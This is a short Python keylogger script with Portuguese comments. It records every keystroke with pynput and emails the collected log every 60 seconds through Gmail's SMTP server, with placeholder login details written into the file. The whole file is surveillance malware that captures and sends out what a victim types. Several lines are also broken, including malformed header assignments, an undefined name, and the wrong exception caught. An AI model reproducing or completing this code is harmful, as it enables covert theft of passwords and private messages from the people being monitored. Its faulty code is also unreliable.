from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#CONFIGURAÇÃO DE EMAIL
EMAIL_ORIGEM = "insira.o.email.aqui@gmail.com"
EMAIL_DESTINO = "insira.o.email.aqui@gmail.com"
SENHA_EMAIL = "1234567!!"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg = ['SUBJECT'] = "Dados capturados pelo keylogger"
        msg = ['From'] = EMAIL_ORIGEM
        msg[To]= EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = "" 

    #Agentar o envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except ArithmeticError:
        if key == keyboard.Key.space:
            log +=" "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[c]"
        else:
            pass #ignorar control

#Inicia o keyboard e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
